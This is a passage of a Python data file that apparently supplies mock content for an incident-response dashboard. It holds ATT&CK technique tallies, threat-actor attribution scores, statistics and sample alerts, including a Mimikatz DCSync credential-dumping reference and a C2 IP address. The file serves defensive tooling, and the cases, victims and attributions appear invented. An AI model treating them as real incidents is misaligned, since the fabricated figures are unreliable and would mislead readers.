        {"id": "T1078",     "name": "Valid Accounts",                  "count": 4, "conf": 92, "cases": ["CASE-2024-001","CASE-2024-002","CASE-2024-003","CASE-2024-004"]},
        {"id": "T1195.002", "name": "Compromise Software Supply Chain","count": 1, "conf": 73, "cases": ["CASE-2024-002"]},
        {"id": "T1133",     "name": "External Remote Services",        "count": 2, "conf": 82, "cases": ["CASE-2024-001","CASE-2024-008"]},
    ],
    "Execution": [
        {"id": "T1059.001", "name": "PowerShell",                      "count": 6, "conf": 98, "cases": ["CASE-2024-001","CASE-2024-002","CASE-2024-004","CASE-2024-005","CASE-2024-008"]},
        {"id": "T1059.003", "name": "Windows Command Shell",           "count": 4, "conf": 95, "cases": ["CASE-2024-001","CASE-2024-005","CASE-2024-006","CASE-2024-008"]},
        {"id": "T1047",     "name": "WMI",                             "count": 3, "conf": 90, "cases": ["CASE-2024-002","CASE-2024-008"]},
        {"id": "T1053.005", "name": "Scheduled Task",                  "count": 3, "conf": 87, "cases": ["CASE-2024-001","CASE-2024-008"]},
    ],
    "Persistence": [
        {"id": "T1547.001", "name": "Registry Run Keys",               "count": 4, "conf": 92, "cases": ["CASE-2024-001","CASE-2024-002","CASE-2024-006"]},
        {"id": "T1543.003", "name": "Windows Service",                 "count": 3, "conf": 89, "cases": ["CASE-2024-001","CASE-2024-005","CASE-2024-006"]},
        {"id": "T1098",     "name": "Account Manipulation",            "count": 2, "conf": 85, "cases": ["CASE-2024-003","CASE-2024-004"]},
        {"id": "T1053.005", "name": "Scheduled Task",                  "count": 2, "conf": 88, "cases": ["CASE-2024-001","CASE-2024-008"]},
    ],
    "Privilege Escalation": [
        {"id": "T1134",     "name": "Access Token Manipulation",       "count": 3, "conf": 91, "cases": ["CASE-2024-001","CASE-2024-002"]},
        {"id": "T1548.002", "name": "Bypass UAC",                      "count": 2, "conf": 84, "cases": ["CASE-2024-001","CASE-2024-005"]},
        {"id": "T1134.001", "name": "Token Impersonation / Theft",     "count": 2, "conf": 88, "cases": ["CASE-2024-001"]},
    ],
    "Defense Evasion": [
        {"id": "T1027",     "name": "Obfuscated Files",                "count": 5, "conf": 94, "cases": ["CASE-2024-001","CASE-2024-002","CASE-2024-005"]},
        {"id": "T1562.001", "name": "Disable Security Tools",          "count": 4, "conf": 89, "cases": ["CASE-2024-001","CASE-2024-006"]},
        {"id": "T1070.004", "name": "File Deletion",                   "count": 3, "conf": 86, "cases": ["CASE-2024-005","CASE-2024-008"]},
        {"id": "T1490",     "name": "Inhibit System Recovery",         "count": 2, "conf": 96, "cases": ["CASE-2024-001","CASE-2024-005"]},
    ],
    "Credential Access": [
        {"id": "T1003.001", "name": "LSASS Memory",                    "count": 5, "conf": 98, "cases": ["CASE-2024-001","CASE-2024-002","CASE-2024-005","CASE-2024-008"]},
        {"id": "T1003.006", "name": "DCSync",                          "count": 3, "conf": 94, "cases": ["CASE-2024-001","CASE-2024-002"]},
        {"id": "T1558.003", "name": "Kerberoasting",                   "count": 2, "conf": 88, "cases": ["CASE-2024-002","CASE-2024-008"]},
        {"id": "T1539",     "name": "Cookie Theft",                    "count": 2, "conf": 81, "cases": ["CASE-2024-003","CASE-2024-007"]},
    ],
    "Discovery": [
        {"id": "T1087.002", "name": "Domain Account Discovery",        "count": 5, "conf": 93, "cases": ["CASE-2024-001","CASE-2024-002","CASE-2024-005"]},
        {"id": "T1046",     "name": "Network Service Scanning",        "count": 4, "conf": 90, "cases": ["CASE-2024-001","CASE-2024-005","CASE-2024-006"]},
        {"id": "T1083",     "name": "File and Directory Discovery",    "count": 3, "conf": 86, "cases": ["CASE-2024-004"]},
    ],
    "Lateral Movement": [
        {"id": "T1550.002", "name": "Pass the Hash",                   "count": 4, "conf": 95, "cases": ["CASE-2024-001","CASE-2024-002","CASE-2024-005"]},
        {"id": "T1021.001", "name": "Remote Desktop Protocol",         "count": 5, "conf": 92, "cases": ["CASE-2024-001","CASE-2024-002","CASE-2024-006","CASE-2024-008"]},
        {"id": "T1021.006", "name": "Windows Remote Management",       "count": 2, "conf": 84, "cases": ["CASE-2024-002","CASE-2024-008"]},
    ],
    "Collection": [
        {"id": "T1560.001", "name": "Archive via Utility",             "count": 4, "conf": 91, "cases": ["CASE-2024-001","CASE-2024-004","CASE-2024-005"]},
        {"id": "T1005",     "name": "Data from Local System",          "count": 3, "conf": 88, "cases": ["CASE-2024-001","CASE-2024-004"]},
        {"id": "T1114",     "name": "Email Collection",                "count": 3, "conf": 85, "cases": ["CASE-2024-003","CASE-2024-007"]},
    ],
    "Command and Control": [
        {"id": "T1071.001", "name": "Web Protocols (HTTPS)",           "count": 6, "conf": 97, "cases": ["CASE-2024-001","CASE-2024-002","CASE-2024-005","CASE-2024-006"]},
        {"id": "T1573.001", "name": "Symmetric Cryptography",          "count": 4, "conf": 89, "cases": ["CASE-2024-002","CASE-2024-005"]},
        {"id": "T1090.001", "name": "Internal Proxy",                  "count": 2, "conf": 82, "cases": ["CASE-2024-002"]},
    ],
    "Exfiltration": [
        {"id": "T1041",     "name": "Exfil Over C2 Channel",           "count": 5, "conf": 95, "cases": ["CASE-2024-001","CASE-2024-002","CASE-2024-005"]},
        {"id": "T1048.003", "name": "Non-Encrypted Protocol",          "count": 2, "conf": 81, "cases": ["CASE-2024-004"]},
        {"id": "T1567.002", "name": "Exfil to Cloud Storage",          "count": 2, "conf": 85, "cases": ["CASE-2024-004"]},
    ],
    "Impact": [
        {"id": "T1486",     "name": "Data Encrypted for Impact",       "count": 3, "conf": 99, "cases": ["CASE-2024-001","CASE-2024-005","CASE-2024-008"]},
        {"id": "T1490",     "name": "Inhibit System Recovery",         "count": 3, "conf": 97, "cases": ["CASE-2024-001","CASE-2024-005"]},
        {"id": "T1657",     "name": "Financial Theft",                 "count": 2, "conf": 94, "cases": ["CASE-2024-005","CASE-2024-006"]},
    ],
}

# ── THREAT ACTORS ──────────────────────────────────────────────────────────
THREAT_ACTORS: list[dict[str, Any]] = [
    {"name": "ALPHV / BlackCat",  "type": "Ransomware-as-a-Service", "origin": "Russia/CIS", "confidence": 87, "cases": ["CASE-2024-001"], "iocs_shared": 12, "ttps_matched": 8,  "color": "#FF4D4F"},
    {"name": "APT29 / Cozy Bear", "type": "Nation-State (SVR)",       "origin": "Russia",     "confidence": 73, "cases": ["CASE-2024-002"], "iocs_shared":  9, "ttps_matched": 7,  "color": "#FA8C16"},
    {"name": "Lazarus Group",     "type": "Nation-State (RGB)",        "origin": "DPRK",       "confidence": 81, "cases": ["CASE-2024-005"], "iocs_shared": 11, "ttps_matched": 9,  "color": "#722ED1"},
    {"name": "FIN7 / Carbanak",   "type": "eCrime / FIN",             "origin": "Ukraine/RU", "confidence": 76, "cases": ["CASE-2024-006"], "iocs_shared":  7, "ttps_matched": 6,  "color": "#1890FF"},
    {"name": "TA505",             "type": "eCrime",                   "origin": "Unknown",    "confidence": 41, "cases": ["CASE-2024-003"], "iocs_shared":  3, "ttps_matched": 4,  "color": "#13C2C2"},
    {"name": "APT41",             "type": "Nation-State (MSS)",        "origin": "China",      "confidence": 58, "cases": ["CASE-2024-008"], "iocs_shared":  5, "ttps_matched": 5,  "color": "#52C41A"},
]

# ── DASHBOARD STATS ────────────────────────────────────────────────────────
DASHBOARD_STATS: dict[str, Any] = {
    "active_cases":       {"value": 23,          "raw": 23,      "trend": "up",      "delta": "+3",     "spark": _spark(23, "up", 0.15)},
    "open_investigations":{"value": 47,          "raw": 47,      "trend": "up",      "delta": "+8",     "spark": _spark(47, "up", 0.1)},
    "evidence_volume":    {"value": "8.4 TB",    "raw": 8.4,     "trend": "up",      "delta": "+1.2TB", "spark": _spark(8.4, "up", 0.08)},
    "timeline_events":    {"value": "12,847",    "raw": 12847,   "trend": "up",      "delta": "+1.2K",  "spark": _spark(12847, "up", 0.05)},
    "iocs_discovered":    {"value": "3,291",     "raw": 3291,    "trend": "up",      "delta": "+187",   "spark": _spark(3291, "up", 0.08)},
    "actor_matches":      {"value": 7,           "raw": 7,       "trend": "neutral", "delta": "—",      "spark": _spark(7, "neutral", 0.2)},
    "hours_saved":        {"value": "2,847h",    "raw": 2847,    "trend": "up",      "delta": "+340h",  "spark": _spark(2847, "up", 0.05)},
}

# ── RECENT ALERTS ──────────────────────────────────────────────────────────
RECENT_ALERTS: list[dict[str, Any]] = [
    {"icon": "🔴", "title": "Critical: Ransomware Encryption Detected",
     "desc": "ALPHV variant — 847 systems encrypting at Meridian Healthcare",  "time": "2m ago",  "risk": "critical"},
    {"icon": "🟠", "title": "High: DCSync Activity on Domain Controller",
     "desc": "DC-MERIDIAN-01 — Mimikatz dcsync /all by compromised admin",     "time": "18m ago", "risk": "high"},
    {"icon": "🟠", "title": "High: Cobalt Strike Beacon Detected",
     "desc": "HTTPS C2 to 194.165.16.98:443 — 5min check-in interval",        "time": "1h ago",  "risk": "high"},
    {"icon": "🟡", "title": "Medium: Suspicious RDP Lateral Movement",
     "desc": "4 hospital servers accessed via RDP from compromised DC",        "time": "3h ago",  "risk": "medium"},
    {"icon": "🔵", "title": "Info: Evidence Chain Integrity Verified",
     "desc": "EV-2024-001-02 SHA-256 match confirmed — PASS",                 "time": "5h ago",  "risk": "info"},
    {"icon": "🟡", "title": "Medium: IOC Enrichment Complete",
     "desc": "312 IOCs enriched — 14 new high-confidence malicious indicators","time": "6h ago",  "risk": "medium"},
    {"icon": "🟠", "title": "High: New Case Opened — Law Firm BEC",
     "desc": "CASE-2024-007 opened — Blackwood & Associates credential theft", "time": "8h ago",  "risk": "high"},
]
